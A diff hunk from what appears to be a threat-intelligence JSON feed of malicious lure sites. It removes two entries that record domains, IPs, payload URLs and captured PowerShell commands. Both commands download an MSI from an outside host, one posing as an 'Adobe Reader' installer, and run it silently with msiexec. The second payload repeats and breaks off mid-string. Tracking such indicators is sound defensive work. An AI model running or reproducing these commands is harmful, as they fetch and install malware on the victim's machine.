@@ -12825,43 +12825,5 @@
     ],
     "ReportId": "cmwgvo0m00m050omlpv3izxoy",
     "ScannedAt": "2026-11-14T20:48:12.105000+00:00"
-  },
-  {
-    "UrlDomain": "dekingsproject.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "199.188.206.22"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwgs7swd0lxo0oml3ahm9x1b",
-    "ScannedAt": "2026-11-14T19:11:36.644000+00:00"
-  },
-  {
-    "UrlDomain": "pdfdocumentsharepoint.com",
-    "DeliveryUrl": [
-      "virtual-video-session.com"
-    ],
-    "PayloadUrl": [
-      "https://virtual-video-session.com/Adobe%20Reader.msi"
-    ],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [],
-    "Payload": "powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit\" powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit\" powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\\\sc.msi, ' powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/q powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\\\sc.",
-    "ResolvedDownloadUrl": [
-      "https://virtual-video-session.com/Adobe%20Reader.msi"
-    ],
-    "ReportId": "cmwgrz6qp0lwz0omly2u8bt21",
-    "ScannedAt": "2026-11-14T19:04:54.671000+00:00"
   }
 ]
